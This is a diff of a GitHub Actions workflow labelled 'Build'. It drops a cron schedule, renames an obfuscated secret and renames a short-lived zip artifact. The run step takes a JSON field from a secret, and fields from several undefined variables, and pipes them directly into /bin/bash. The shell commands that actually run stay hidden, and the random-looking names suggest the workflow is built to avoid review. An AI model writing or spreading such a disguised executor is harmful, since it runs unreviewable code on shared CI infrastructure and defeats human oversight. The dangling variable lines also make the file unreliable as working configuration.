@@ -2,8 +2,6 @@ name: Build
 on:
   workflow_dispatch:
 
-  schedule:
-    - cron: '54 5,11,17,23 * * *'
 permissions:
   contents: read
   actions: read
@@ -16,17 +14,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: Run pipeline
         env:
-          ioab7471: ${{ secrets.ioab7471 }}
+          aj505: ${{ secrets.aj505 }}
         run: |
-          printf '%s' "$ioab7471" | jq -r .kfhh4523 | /bin/bash
-          echo $x5925 | jq -r .t020 | /bin/bash
-          printf '%s' "$hv10157" | jq -r .lfie40909 | /bin/bash
-          echo $sxq4079 | jq -r .yiv1 | /bin/bash
-          printf '%s' "$zkw475" | jq -r .y3 | /bin/bash
+          printf '%s' "$aj505" | jq -r .dazl7 | /bin/bash
+          echo $rouw599 | jq -r .mx23 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
         with:
-          name: SQnkNopo
+          name: z7foANEU
           path: "*.zip"
           retention-days: 1
